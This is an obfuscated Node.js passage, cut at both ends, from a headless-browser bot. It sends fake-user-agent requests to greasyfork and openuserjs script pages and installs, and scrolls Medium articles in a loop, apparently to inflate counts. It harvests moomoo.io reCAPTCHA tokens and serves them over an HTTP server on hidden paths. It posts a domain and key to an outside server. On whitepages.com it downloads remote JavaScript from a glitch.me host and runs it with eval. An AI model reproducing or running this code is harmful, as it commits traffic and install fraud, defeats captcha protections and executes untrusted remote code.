      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + Z(0x18, 'eJBa') + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Z(0x16, 'OHi]')
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x14) + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + Z(0x0, '$wlL') + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + Z(0xe, ']H(k') + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    Y(0xf) + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + X(0x13) + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1cc7 + -0x99 * -0x1 + -0x1d60
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0xda * 0x9 + 0x1dcf + -0x1625)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1a * 0xd9 + -0x101d + 0x268b), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0xe0 * -0x10 + -0x1 * -0x1247 + 0x1 * -0x3e3), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0xb65 + -0x105f + 0x1bc4;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x6a3 + -0xb6a + 0x120d; w < getRandomInt(-0x2171 + -0xb3f * -0x1 + 0x1633, -0x244a + 0x776 * 0x1 + 0x1 * 0x1cd9); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x3f0a * 0x3 + -0x4c9d + 0x1f41b);
        }
      }();
    }, -0x3 * -0x7c9 + -0x1445 + -0x2b2), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1 * 0x1ff + 0x4 * 0x10d + -0x1 * 0x235;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1 * 0xa43 + -0xa75 * 0x1 + 0x14b8, 0x1ca + -0x1 * 0x1549 + 0x13b1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x53 * 0x24d + -0x57b5 * 0x1 + 0xdee);
    }, -0x15 * -0x101 + -0x1edb + 0xa2a), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x5e8 + -0xb * 0x251 + 0x5 * 0x647;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x259b + 0x2424 + 0xd2f), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x607 * 0x1 + 0x16 * 0x80 + -0x4f9), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x16e5c1 + 0x39b73 * -0x1 + -0x65 * 0xe16);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1 * 0xbf7 + 0x49 + -0xc12 * -0x1);
  })()), doFlags[X(0xd) + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x175 * 0x1 + 0x3 * 0x55c + 0x10c1 * -0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0xd * 0x3b9 + 0x3994 + -0x4a69);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = c,
    a0 = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1830 + 0xafc + 0x45 * 0x31) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x15 * -0x15 + 0x1572 + -0x1 * 0x172a));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x5dc + 0x1 * -0x3f5 + 0x9d1, D['indexOf']('\x20'));
        return B ? E['slice'](0x5b * 0x25 + -0x570 + -0x7b7, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x45 * 0xb0 + 0x1 * 0x43f2 + -0x4c52),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x3141 * 0x1 + -0x4d51 + 0xa5a2),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + a0(0x6, 'oVhG') + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + a1(0x2) + '80%81%E7%8' + a0(0x3, ']&^v') + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
